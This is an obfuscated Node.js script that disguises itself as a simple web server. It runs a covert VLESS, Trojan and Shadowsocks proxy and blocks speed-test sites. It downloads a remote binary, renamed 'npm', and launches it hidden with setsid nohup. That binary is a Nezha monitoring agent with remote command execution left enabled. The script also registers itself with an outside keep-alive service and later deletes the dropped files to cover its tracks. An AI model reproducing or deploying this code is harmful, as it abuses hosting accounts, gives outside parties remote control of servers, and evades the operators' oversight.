#!/usr/bin/env node

function _0x4a4c(_0x52105f,_0x35108e){const _0x14f434=_0x4b8d();return _0x4a4c=function(_0x464a04,_0x216b5e){_0x464a04=_0x464a04-0xec;let _0x5014ff=_0x14f434[_0x464a04];return _0x5014ff;},_0x4a4c(_0x52105f,_0x35108e);}const _0x157c1=_0x4a4c;(function(_0x238bcf,_0x478131){const _0x235715=_0x4a4c,_0x44e4f7=_0x238bcf();while(!![]){try{const _0x15ea27=parseInt(_0x235715(0x13f))/0x1+-parseInt(_0x235715(0x157))/0x2+parseInt(_0x235715(0x12d))/0x3*(-parseInt(_0x235715(0x143))/0x4)+-parseInt(_0x235715(0x13b))/0x5+parseInt(_0x235715(0x171))/0x6*(-parseInt(_0x235715(0x106))/0x7)+parseInt(_0x235715(0x10a))/0x8+parseInt(_0x235715(0xf3))/0x9;if(_0x15ea27===_0x478131)break;else _0x44e4f7['push'](_0x44e4f7['shift']());}catch(_0x33a5a3){_0x44e4f7['push'](_0x44e4f7['shift']());}}}(_0x4b8d,0xb00c8));const _0x1d0528=(function(){let _0x2817fd=!![];return function(_0x2e5fda,_0xfbd797){const _0x2c3899=_0x2817fd?function(){const _0x3cba38=_0x4a4c;if(_0xfbd797){const _0x27955a=_0xfbd797[_0x3cba38(0xed)](_0x2e5fda,arguments);return _0xfbd797=null,_0x27955a;}}:function(){};return _0x2817fd=![],_0x2c3899;};}()),_0x4c6a37=_0x1d0528(this,function(){const _0x247660=_0x4a4c;return _0x4c6a37['toString']()[_0x247660(0x149)]('(((.+)+)+)+$')['toString']()[_0x247660(0x10e)](_0x4c6a37)['search'](_0x247660(0x119));});function _0x4b8d(){const _0xcd8ce=['46158rVUAYg','trim','close','arm','7046528WPVxhl','connection','every','Status','constructor','url','none','https://amd64.ssss.nyc.mn/agent','41f13f81-cb68-46a9-a841-ec76f721234b','country_code','catch','toString','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','writeFileSync','(((.+)+)+)+$','speed.io','base64','Not\x20Found\x0a','sha224','--tls','&sni=','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','unlink','application/dns-json','crypto','config.yaml','https://arm64.ssss.nyc.mn/v1','length','console','stream','aarch64','https://api-ipv4.ip.sb/ip','8.8.4.4','substr','19077TgxzIz','prototype','NEZHA_SERVER','info','librespeed.org','writeHead','text/html','vless://','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','return\x20(function()\x20','map','listen','speedof.me','8443','4763610YcykUg','ccx','createHash','join','964938RYEEJH','utf8','utf-8','createServer','4SIRqOy','includes','reduce','replace','speedtest.net','Unknown','search','NEZHA_KEY','__proto__','\x20-p\x20','hex','type','forEach','connect','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://','bind','DOMAIN','find','message','564228YmtFwH','finish','npm\x20is\x20running','&fp=chrome&type=ws&host=','endsWith','cahnge-your-domain.com','?security=','warn','env','fast.com','get','https://api.ip.sb/geoip','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2083','from','Failed\x20to\x20resolve\x20','bandwidth.place','none:','index.html','text/plain','child_process','Server\x20is\x20running\x20on\x20port\x20','setsid\x20nohup\x20./npm\x20-s\x20','slice','readUInt8','testmy.net','1038HtwDZu','true','path','send','https://dns.google/resolve?name=','toLowerCase','application/json','Server','chmod\x20+x\x20npm','end','exception','NEZHA_PORT','data','createWriteStream','once','npm\x20running\x20error:','table','?encryption=none&security=',';skip-cert-verify%3Dtrue;mux%3D0#','digest','2087','isp','readUInt16BE','pipe','Automatic\x20Access\x20Task\x20added\x20successfully','client_secret:\x20','axios','then','trace','write','trojan://','arm64','AUTO_ACCESS','UUID','apply','Mozilla/5.0','sub','npm\x20download\x20successfully','9168688.xyz','http://ip-api.com/json','11315691kKYSZp','speed.cloudflare.com','https://amd64.ssss.nyc.mn/v1','{}.constructor(\x22return\x20this\x22)(\x20)','speedtest.cn','error','tls','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ss://','1.1.1.1','Answer','net','/bin/bash','log','concat','&path=%2F','npm','443','some'];_0x4b8d=function(){return _0xcd8ce;};return _0x4b8d();}_0x4c6a37();const _0x216b5e=(function(){let _0xef38d8=!![];return function(_0x5e3623,_0x4c0516){const _0x2f3bda=_0xef38d8?function(){const _0x282172=_0x4a4c;if(_0x4c0516){const _0x10d432=_0x4c0516[_0x282172(0xed)](_0x5e3623,arguments);return _0x4c0516=null,_0x10d432;}}:function(){};return _0xef38d8=![],_0x2f3bda;};}()),_0x464a04=_0x216b5e(this,function(){const _0x386098=_0x4a4c,_0x2a15cf=function(){const _0x156659=_0x4a4c;let _0x2a290f;try{_0x2a290f=Function(_0x156659(0x136)+_0x156659(0xf6)+');')();}catch(_0x218036){_0x2a290f=window;}return _0x2a290f;},_0xdcd5ae=_0x2a15cf(),_0xd2290e=_0xdcd5ae[_0x386098(0x127)]=_0xdcd5ae['console']||{},_0x3fab52=['log',_0x386098(0x15e),_0x386098(0x130),_0x386098(0xf8),_0x386098(0x17b),_0x386098(0x181),_0x386098(0x18d)];for(let _0x413819=0x0;_0x413819<_0x3fab52[_0x386098(0x126)];_0x413819++){const _0xf8ee3b=_0x216b5e[_0x386098(0x10e)][_0x386098(0x12e)][_0x386098(0x153)](_0x216b5e),_0xc4a228=_0x3fab52[_0x413819],_0x11fa59=_0xd2290e[_0xc4a228]||_0xf8ee3b;_0xf8ee3b[_0x386098(0x14b)]=_0x216b5e[_0x386098(0x153)](_0x216b5e),_0xf8ee3b[_0x386098(0x115)]=_0x11fa59['toString'][_0x386098(0x153)](_0x11fa59),_0xd2290e[_0xc4a228]=_0xf8ee3b;}});_0x464a04();const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x157c1(0x18b)),net=require(_0x157c1(0xfe)),path=require(_0x157c1(0x173)),crypto=require(_0x157c1(0x123)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x157c1(0x16b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x157c1(0x15f)][_0x157c1(0xec)]||_0x157c1(0x112),NEZHA_SERVER=process[_0x157c1(0x15f)][_0x157c1(0x12f)]||'',NEZHA_PORT=process[_0x157c1(0x15f)][_0x157c1(0x17c)]||'',NEZHA_KEY=process[_0x157c1(0x15f)][_0x157c1(0x14a)]||'',DOMAIN=process[_0x157c1(0x15f)][_0x157c1(0x154)]||_0x157c1(0xf1),AUTO_ACCESS=process[_0x157c1(0x15f)][_0x157c1(0x191)]||![],WSPATH=process[_0x157c1(0x15f)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x157c1(0x15f)]['SUB_PATH']||_0x157c1(0xef),NAME=process[_0x157c1(0x15f)]['NAME']||_0x157c1(0x13c),PORT=process[_0x157c1(0x15f)]['PORT']||0xbb8;let uuid=UUID[_0x157c1(0x146)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x157c1(0xf9),CurrentPort=0x1bb,ISP='';const DNS_SERVERS=[_0x157c1(0x12b),_0x157c1(0xfc)],BLOCKED_DOMAINS=[_0x157c1(0x147),_0x157c1(0x160),_0x157c1(0xf7),_0x157c1(0xf4),_0x157c1(0x139),_0x157c1(0x170),_0x157c1(0x167),_0x157c1(0x11a),_0x157c1(0x131),'speedcheck.org'];function isBlockedDomain(_0xc43754){const _0x539f94=_0x157c1;if(!_0xc43754)return![];const _0x2034ec=_0xc43754[_0x539f94(0x176)]();return BLOCKED_DOMAINS[_0x539f94(0x105)](_0x35b310=>{const _0x12c9c2=_0x539f94;return _0x2034ec===_0x35b310||_0x2034ec[_0x12c9c2(0x15b)]('.'+_0x35b310);});}async function getisp(){const _0x29b3f0=_0x157c1;try{const _0x7fe75e=await axios[_0x29b3f0(0x161)](_0x29b3f0(0x162),{'headers':{'User-Agent':_0x29b3f0(0xee),'timeout':0xbb8}}),_0x343dcf=_0x7fe75e[_0x29b3f0(0x17d)];ISP=(_0x343dcf[_0x29b3f0(0x113)]+'-'+_0x343dcf[_0x29b3f0(0x186)])[_0x29b3f0(0x146)](/ /g,'_');}catch(_0x1c264e){try{const _0x25a0b7=await axios[_0x29b3f0(0x161)](_0x29b3f0(0xf2),{'headers':{'User-Agent':_0x29b3f0(0xee),'timeout':0xbb8}}),_0x5cf6f3=_0x25a0b7['data'];ISP=(_0x5cf6f3['countryCode']+'-'+_0x5cf6f3['org'])['replace'](/ /g,'_');}catch(_0x5f3ca6){ISP=_0x29b3f0(0x148);}}}async function getip(){const _0x27efcb=_0x157c1;if(!DOMAIN||DOMAIN==='your-domain.com')try{const _0x3d0a8e=await axios[_0x27efcb(0x161)](_0x27efcb(0x12a),{'timeout':0x1388}),_0x4f1095=_0x3d0a8e['data'][_0x27efcb(0x107)]();CurrentDomain=_0x4f1095,Tls=_0x27efcb(0x110),CurrentPort=PORT;}catch(_0x6e91b5){console[_0x27efcb(0xf8)]('Failed\x20to\x20get\x20IP',_0x6e91b5[_0x27efcb(0x156)]),(CurrentDomain=_0x27efcb(0x15c),Tls=_0x27efcb(0xf9),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x27efcb(0xf9),CurrentPort=0x1bb;}const httpServer=http[_0x157c1(0x142)](async(_0x419604,_0x372340)=>{const _0x4ef9b1=_0x157c1;if(_0x419604['url']==='/'){const _0x426a91=path['join'](__dirname,_0x4ef9b1(0x169));fs['readFile'](_0x426a91,_0x4ef9b1(0x140),(_0x3d7384,_0xc3069a)=>{const _0xddd594=_0x4ef9b1;if(_0x3d7384){_0x372340[_0xddd594(0x132)](0xc8,{'Content-Type':_0xddd594(0x133)}),_0x372340[_0xddd594(0x17a)]('Hello\x20world!');return;}_0x372340['writeHead'](0xc8,{'Content-Type':_0xddd594(0x133)}),_0x372340['end'](_0xc3069a);});return;}else{if(_0x419604[_0x4ef9b1(0x10f)]==='/'+SUB_PATH){await getisp(),await getip();const _0x541930=NAME?NAME+'-'+ISP:ISP,_0x51711f=Tls===_0x4ef9b1(0xf9)?'tls':_0x4ef9b1(0x110),_0x1e4cfb=Tls===_0x4ef9b1(0xf9)?'tls;':'',_0x47b0c1=_0x4ef9b1(0x134)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x4ef9b1(0x182)+_0x51711f+_0x4ef9b1(0x11f)+CurrentDomain+_0x4ef9b1(0x15a)+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x541930,_0x454c93=_0x4ef9b1(0x18f)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x4ef9b1(0x15d)+_0x51711f+_0x4ef9b1(0x11f)+CurrentDomain+_0x4ef9b1(0x15a)+CurrentDomain+_0x4ef9b1(0x102)+WSPATH+'#'+_0x541930,_0x445d51=Buffer[_0x4ef9b1(0x165)](_0x4ef9b1(0x168)+UUID)[_0x4ef9b1(0x115)](_0x4ef9b1(0x11b)),_0x5b8cf=_0x4ef9b1(0xfb)+_0x445d51+'@'+CurrentDomain+':'+CurrentPort+_0x4ef9b1(0x135)+CurrentDomain+';path%3D%2F'+WSPATH+';'+_0x1e4cfb+'sni%3D'+CurrentDomain+_0x4ef9b1(0x183)+_0x541930,_0x5aa1da=_0x47b0c1+'\x0a'+_0x454c93+'\x0a'+_0x5b8cf,_0x3c1d59=Buffer[_0x4ef9b1(0x165)](_0x5aa1da)[_0x4ef9b1(0x115)]('base64');_0x372340[_0x4ef9b1(0x132)](0xc8,{'Content-Type':'text/plain'}),_0x372340['end'](_0x3c1d59+'\x0a');}else _0x372340[_0x4ef9b1(0x132)](0x194,{'Content-Type':_0x4ef9b1(0x16a)}),_0x372340[_0x4ef9b1(0x17a)](_0x4ef9b1(0x11c));}});function resolveHost(_0x7df08f){return new Promise((_0x3ff316,_0x3e6fba)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x7df08f)){_0x3ff316(_0x7df08f);return;}let _0x218f8e=0x0;function _0x25cb44(){const _0x2e96ee=_0x4a4c;if(_0x218f8e>=DNS_SERVERS[_0x2e96ee(0x126)]){_0x3e6fba(new Error(_0x2e96ee(0x166)+_0x7df08f+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3d0436=DNS_SERVERS[_0x218f8e];_0x218f8e++;const _0x1c0039=_0x2e96ee(0x175)+encodeURIComponent(_0x7df08f)+'&type=A';axios[_0x2e96ee(0x161)](_0x1c0039,{'timeout':0x1388,'headers':{'Accept':_0x2e96ee(0x122)}})['then'](_0x1ce620=>{const _0xb291a=_0x2e96ee,_0x3ff998=_0x1ce620[_0xb291a(0x17d)];if(_0x3ff998[_0xb291a(0x10d)]===0x0&&_0x3ff998['Answer']&&_0x3ff998[_0xb291a(0xfd)][_0xb291a(0x126)]>0x0){const _0x43b4a6=_0x3ff998[_0xb291a(0xfd)][_0xb291a(0x155)](_0x42d286=>_0x42d286[_0xb291a(0x14e)]===0x1);if(_0x43b4a6){_0x3ff316(_0x43b4a6['data']);return;}}_0x25cb44();})['catch'](_0x14ad4a=>{_0x25cb44();});}_0x25cb44();});}function handleVlsConnection(_0x5ee925,_0x54fe48){const _0x632ad8=_0x157c1,[_0x16645d]=_0x54fe48,_0x12f816=_0x54fe48[_0x632ad8(0x16e)](0x1,0x11);if(!_0x12f816[_0x632ad8(0x10c)]((_0x4039c5,_0x257865)=>_0x4039c5==parseInt(uuid[_0x632ad8(0x12c)](_0x257865*0x2,0x2),0x10)))return![];let _0x174e0c=_0x54fe48[_0x632ad8(0x16e)](0x11,0x12)[_0x632ad8(0x16f)]()+0x13;const _0x62ddac=_0x54fe48[_0x632ad8(0x16e)](_0x174e0c,_0x174e0c+=0x2)['readUInt16BE'](0x0),_0x208661=_0x54fe48['slice'](_0x174e0c,_0x174e0c+=0x1)[_0x632ad8(0x16f)](),_0x1e3764=_0x208661==0x1?_0x54fe48[_0x632ad8(0x16e)](_0x174e0c,_0x174e0c+=0x4)[_0x632ad8(0x13e)]('.'):_0x208661==0x2?new TextDecoder()['decode'](_0x54fe48['slice'](_0x174e0c+0x1,_0x174e0c+=0x1+_0x54fe48[_0x632ad8(0x16e)](_0x174e0c,_0x174e0c+0x1)[_0x632ad8(0x16f)]())):_0x208661==0x3?_0x54fe48[_0x632ad8(0x16e)](_0x174e0c,_0x174e0c+=0x10)[_0x632ad8(0x145)]((_0x17523f,_0x269dbf,_0x467f28,_0x51f80a)=>_0x467f28%0x2?_0x17523f[_0x632ad8(0x101)](_0x51f80a['slice'](_0x467f28-0x1,_0x467f28+0x1)):_0x17523f,[])[_0x632ad8(0x137)](_0x1d417d=>_0x1d417d[_0x632ad8(0x187)](0x0)[_0x632ad8(0x115)](0x10))[_0x632ad8(0x13e)](':'):'';if(isBlockedDomain(_0x1e3764))return _0x5ee925['close'](),![];_0x5ee925[_0x632ad8(0x174)](new Uint8Array([_0x16645d,0x0]));const _0x51f1d1=createWebSocketStream(_0x5ee925);return resolveHost(_0x1e3764)[_0x632ad8(0x18c)](_0x336475=>{const _0x144c48=_0x632ad8;net[_0x144c48(0x150)]({'host':_0x336475,'port':_0x62ddac},function(){const _0x2b68eb=_0x144c48;this[_0x2b68eb(0x18e)](_0x54fe48[_0x2b68eb(0x16e)](_0x174e0c)),_0x51f1d1['on'](_0x2b68eb(0xf8),()=>{})[_0x2b68eb(0x188)](this)['on'](_0x2b68eb(0xf8),()=>{})['pipe'](_0x51f1d1);})['on'](_0x144c48(0xf8),()=>{});})[_0x632ad8(0x114)](_0x1fa870=>{const _0x511003=_0x632ad8;net[_0x511003(0x150)]({'host':_0x1e3764,'port':_0x62ddac},function(){const _0x4c7e2a=_0x511003;this['write'](_0x54fe48[_0x4c7e2a(0x16e)](_0x174e0c)),_0x51f1d1['on'](_0x4c7e2a(0xf8),()=>{})[_0x4c7e2a(0x188)](this)['on']('error',()=>{})[_0x4c7e2a(0x188)](_0x51f1d1);})['on'](_0x511003(0xf8),()=>{});}),!![];}function handleTrojConnection(_0x57a796,_0x39423d){const _0x2f3a7d=_0x157c1;try{if(_0x39423d[_0x2f3a7d(0x126)]<0x3a)return![];const _0x59a71b=_0x39423d[_0x2f3a7d(0x16e)](0x0,0x38)['toString'](),_0x3555da=[UUID];let _0x1c03b9=null;for(const _0x47c703 of _0x3555da){const _0x249a79=crypto[_0x2f3a7d(0x13d)](_0x2f3a7d(0x11d))['update'](_0x47c703)[_0x2f3a7d(0x184)](_0x2f3a7d(0x14d));if(_0x249a79===_0x59a71b){_0x1c03b9=_0x47c703;break;}}if(!_0x1c03b9)return![];let _0x4e32a8=0x38;_0x39423d[_0x4e32a8]===0xd&&_0x39423d[_0x4e32a8+0x1]===0xa&&(_0x4e32a8+=0x2);const _0x23d4ee=_0x39423d[_0x4e32a8];if(_0x23d4ee!==0x1)return![];_0x4e32a8+=0x1;const _0x26702f=_0x39423d[_0x4e32a8];_0x4e32a8+=0x1;let _0x43032e,_0x56996e;if(_0x26702f===0x1)_0x43032e=_0x39423d[_0x2f3a7d(0x16e)](_0x4e32a8,_0x4e32a8+0x4)['join']('.'),_0x4e32a8+=0x4;else{if(_0x26702f===0x3){const _0x5628fd=_0x39423d[_0x4e32a8];_0x4e32a8+=0x1,_0x43032e=_0x39423d['slice'](_0x4e32a8,_0x4e32a8+_0x5628fd)['toString'](),_0x4e32a8+=_0x5628fd;}else{if(_0x26702f===0x4)_0x43032e=_0x39423d[_0x2f3a7d(0x16e)](_0x4e32a8,_0x4e32a8+0x10)['reduce']((_0x59a646,_0x1c3f97,_0x267682,_0x2592b6)=>_0x267682%0x2?_0x59a646[_0x2f3a7d(0x101)](_0x2592b6[_0x2f3a7d(0x16e)](_0x267682-0x1,_0x267682+0x1)):_0x59a646,[])[_0x2f3a7d(0x137)](_0x5f65c=>_0x5f65c[_0x2f3a7d(0x187)](0x0)[_0x2f3a7d(0x115)](0x10))['join'](':'),_0x4e32a8+=0x10;else return![];}}_0x56996e=_0x39423d['readUInt16BE'](_0x4e32a8),_0x4e32a8+=0x2;_0x4e32a8<_0x39423d['length']&&_0x39423d[_0x4e32a8]===0xd&&_0x39423d[_0x4e32a8+0x1]===0xa&&(_0x4e32a8+=0x2);if(isBlockedDomain(_0x43032e))return _0x57a796[_0x2f3a7d(0x108)](),![];const _0x66e234=createWebSocketStream(_0x57a796);return resolveHost(_0x43032e)[_0x2f3a7d(0x18c)](_0x3fa531=>{const _0x542363=_0x2f3a7d;net[_0x542363(0x150)]({'host':_0x3fa531,'port':_0x56996e},function(){const _0x283fda=_0x542363;_0x4e32a8<_0x39423d[_0x283fda(0x126)]&&this[_0x283fda(0x18e)](_0x39423d[_0x283fda(0x16e)](_0x4e32a8)),_0x66e234['on'](_0x283fda(0xf8),()=>{})['pipe'](this)['on'](_0x283fda(0xf8),()=>{})[_0x283fda(0x188)](_0x66e234);})['on']('error',()=>{});})[_0x2f3a7d(0x114)](_0x33e0ea=>{const _0x8dc723=_0x2f3a7d;net[_0x8dc723(0x150)]({'host':_0x43032e,'port':_0x56996e},function(){const _0x414301=_0x8dc723;_0x4e32a8<_0x39423d[_0x414301(0x126)]&&this[_0x414301(0x18e)](_0x39423d['slice'](_0x4e32a8)),_0x66e234['on'](_0x414301(0xf8),()=>{})[_0x414301(0x188)](this)['on'](_0x414301(0xf8),()=>{})[_0x414301(0x188)](_0x66e234);})['on'](_0x8dc723(0xf8),()=>{});}),!![];}catch(_0x239851){return![];}}function handleSsConnection(_0x2c541d,_0x2eb2bc){const _0xfa649b=_0x157c1;try{let _0x565f73=0x0;const _0x530fec=_0x2eb2bc[_0x565f73];_0x565f73+=0x1;let _0x1fa9cb,_0x5ed650;if(_0x530fec===0x1)_0x1fa9cb=_0x2eb2bc['slice'](_0x565f73,_0x565f73+0x4)['join']('.'),_0x565f73+=0x4;else{if(_0x530fec===0x3){const _0x24a878=_0x2eb2bc[_0x565f73];_0x565f73+=0x1,_0x1fa9cb=_0x2eb2bc[_0xfa649b(0x16e)](_0x565f73,_0x565f73+_0x24a878)[_0xfa649b(0x115)](),_0x565f73+=_0x24a878;}else{if(_0x530fec===0x4)_0x1fa9cb=_0x2eb2bc[_0xfa649b(0x16e)](_0x565f73,_0x565f73+0x10)['reduce']((_0x2ca6ce,_0x5ce864,_0x24bc55,_0x1e7ed5)=>_0x24bc55%0x2?_0x2ca6ce[_0xfa649b(0x101)](_0x1e7ed5[_0xfa649b(0x16e)](_0x24bc55-0x1,_0x24bc55+0x1)):_0x2ca6ce,[])[_0xfa649b(0x137)](_0x489b9b=>_0x489b9b[_0xfa649b(0x187)](0x0)['toString'](0x10))[_0xfa649b(0x13e)](':'),_0x565f73+=0x10;else return![];}}_0x5ed650=_0x2eb2bc[_0xfa649b(0x187)](_0x565f73),_0x565f73+=0x2;if(isBlockedDomain(_0x1fa9cb))return _0x2c541d[_0xfa649b(0x108)](),![];const _0x3253af=createWebSocketStream(_0x2c541d);return resolveHost(_0x1fa9cb)['then'](_0xb1b902=>{const _0x3ef0a7=_0xfa649b;net[_0x3ef0a7(0x150)]({'host':_0xb1b902,'port':_0x5ed650},function(){const _0x2d0d45=_0x3ef0a7;_0x565f73<_0x2eb2bc['length']&&this[_0x2d0d45(0x18e)](_0x2eb2bc[_0x2d0d45(0x16e)](_0x565f73)),_0x3253af['on'](_0x2d0d45(0xf8),()=>{})[_0x2d0d45(0x188)](this)['on']('error',()=>{})[_0x2d0d45(0x188)](_0x3253af);})['on'](_0x3ef0a7(0xf8),()=>{});})['catch'](_0x73533=>{const _0xc159a5=_0xfa649b;net['connect']({'host':_0x1fa9cb,'port':_0x5ed650},function(){const _0x59f61f=_0x4a4c;_0x565f73<_0x2eb2bc['length']&&this[_0x59f61f(0x18e)](_0x2eb2bc[_0x59f61f(0x16e)](_0x565f73)),_0x3253af['on'](_0x59f61f(0xf8),()=>{})[_0x59f61f(0x188)](this)['on'](_0x59f61f(0xf8),()=>{})[_0x59f61f(0x188)](_0x3253af);})['on'](_0xc159a5(0xf8),()=>{});}),!![];}catch(_0x2dd2cf){return![];}}const wss=new WebSocket[(_0x157c1(0x178))]({'server':httpServer});wss['on'](_0x157c1(0x10b),(_0x37081f,_0x2cf97b)=>{const _0x39dabe=_0x157c1,_0x35c076=_0x2cf97b[_0x39dabe(0x10f)]||'',_0x119fea='/'+WSPATH;if(!_0x35c076['startsWith'](_0x119fea)){_0x37081f['close']();return;}_0x37081f[_0x39dabe(0x17f)](_0x39dabe(0x156),_0x333e5f=>{const _0x397351=_0x39dabe;if(_0x333e5f[_0x397351(0x126)]>0x11&&_0x333e5f[0x0]===0x0){const _0x13871e=_0x333e5f[_0x397351(0x16e)](0x1,0x11),_0x7e5686=_0x13871e['every']((_0x5dc1ec,_0x4d6c95)=>_0x5dc1ec==parseInt(uuid[_0x397351(0x12c)](_0x4d6c95*0x2,0x2),0x10));if(_0x7e5686){!handleVlsConnection(_0x37081f,_0x333e5f)&&_0x37081f[_0x397351(0x108)]();return;}}if(_0x333e5f[_0x397351(0x126)]>=0x3a){if(handleTrojConnection(_0x37081f,_0x333e5f))return;}if(_0x333e5f[_0x397351(0x126)]>0x0&&(_0x333e5f[0x0]===0x1||_0x333e5f[0x0]===0x3||_0x333e5f[0x0]===0x4)){if(handleSsConnection(_0x37081f,_0x333e5f))return;}_0x37081f['close']();})['on'](_0x39dabe(0xf8),()=>{});});const getDownloadUrl=()=>{const _0x25cf85=_0x157c1,_0x27664c=os['arch']();return _0x27664c===_0x25cf85(0x109)||_0x27664c===_0x25cf85(0x190)||_0x27664c===_0x25cf85(0x129)?!NEZHA_PORT?_0x25cf85(0x125):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x25cf85(0xf5):_0x25cf85(0x111);},downloadFile=async()=>{const _0x4f9a80=_0x157c1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x467c9a=getDownloadUrl(),_0x5bfb32=await axios({'method':'get','url':_0x467c9a,'responseType':_0x4f9a80(0x128)}),_0x176f7e=fs[_0x4f9a80(0x17e)]('npm');return _0x5bfb32['data']['pipe'](_0x176f7e),new Promise((_0x593427,_0x1ed55b)=>{const _0x1480a3=_0x4f9a80;_0x176f7e['on'](_0x1480a3(0x158),()=>{const _0x39d3b7=_0x1480a3;console['log'](_0x39d3b7(0xf0)),exec(_0x39d3b7(0x179),_0x4b99b9=>{if(_0x4b99b9)_0x1ed55b(_0x4b99b9);_0x593427();});}),_0x176f7e['on']('error',_0x1ed55b);});}catch(_0x417d72){throw _0x417d72;}},runnz=async()=>{const _0x1fcfa4=_0x157c1;try{const _0x3816e6=execSync(_0x1fcfa4(0x151),{'encoding':_0x1fcfa4(0x141)});if(_0x3816e6[_0x1fcfa4(0x107)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4ed21f){}await downloadFile();let _0x1658c9='',_0x180882=[_0x1fcfa4(0x104),_0x1fcfa4(0x13a),'2096',_0x1fcfa4(0x185),_0x1fcfa4(0x164),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x352d3a=_0x180882[_0x1fcfa4(0x144)](NEZHA_PORT)?_0x1fcfa4(0x11e):'';_0x1658c9=_0x1fcfa4(0x16d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1fcfa4(0x14c)+NEZHA_KEY+'\x20'+_0x352d3a+_0x1fcfa4(0x116);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x538810=NEZHA_SERVER[_0x1fcfa4(0x144)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x559632=_0x180882[_0x1fcfa4(0x144)](_0x538810)?_0x1fcfa4(0x172):'false',_0x1232a0=_0x1fcfa4(0x18a)+NEZHA_KEY+_0x1fcfa4(0xfa)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x559632+_0x1fcfa4(0x163)+UUID;fs[_0x1fcfa4(0x118)](_0x1fcfa4(0x124),_0x1232a0);}_0x1658c9=_0x1fcfa4(0x120);}else return;}try{exec(_0x1658c9,{'shell':_0x1fcfa4(0xff)},_0xe798e9=>{const _0x2348b3=_0x1fcfa4;if(_0xe798e9)console['error'](_0x2348b3(0x180),_0xe798e9);else console[_0x2348b3(0x100)](_0x2348b3(0x159));});}catch(_0x67784){console[_0x1fcfa4(0xf8)]('error:\x20'+_0x67784);}};async function addAccessTask(){const _0xe738a5=_0x157c1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x49b193=_0xe738a5(0x152)+DOMAIN+'/'+SUB_PATH;try{const _0x5f1120=await axios['post'](_0xe738a5(0x117),{'url':_0x49b193},{'headers':{'Content-Type':_0xe738a5(0x177)}});console[_0xe738a5(0x100)](_0xe738a5(0x189));}catch(_0x189d3b){}}const delFiles=()=>{const _0xa1106a=_0x157c1;[_0xa1106a(0x103),_0xa1106a(0x124)][_0xa1106a(0x14f)](_0x2a8a37=>fs[_0xa1106a(0x121)](_0x2a8a37,()=>{}));};httpServer[_0x157c1(0x138)](PORT,()=>{const _0x2efbd9=_0x157c1;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x2efbd9(0x16c)+PORT);});
